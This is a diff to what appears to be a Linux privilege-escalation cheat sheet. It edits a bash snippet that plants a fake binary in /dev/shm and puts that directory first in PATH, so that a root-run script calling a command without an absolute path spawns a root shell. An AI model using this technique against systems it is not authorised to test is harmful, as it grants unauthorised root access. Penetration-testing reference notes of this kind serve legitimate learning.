@@ -83,11 +83,13 @@ Shell escape sequences:
 
 [https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/](https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/)
 
-Abuse non-absolute path in binaries/scripts run as root:
+Abuse non-absolute path in scripts/bins run as root:
 
 ```bash
-echo "#!/bin/bash\nbash" > /dev/shm/$SUID_BIN
-chmod +x /dev/shm/$SUID_BIN
+#create the script and rename to match the file you wish to impersonate
+echo "#\!/bin/bash\nbash" > /dev/shm/malicious_bin
+chmod +x /dev/shm/malicious_bin
+#make sure it searches /dev/shm first for the file
 export PATH=/dev/shm:$PATH
 ```
 
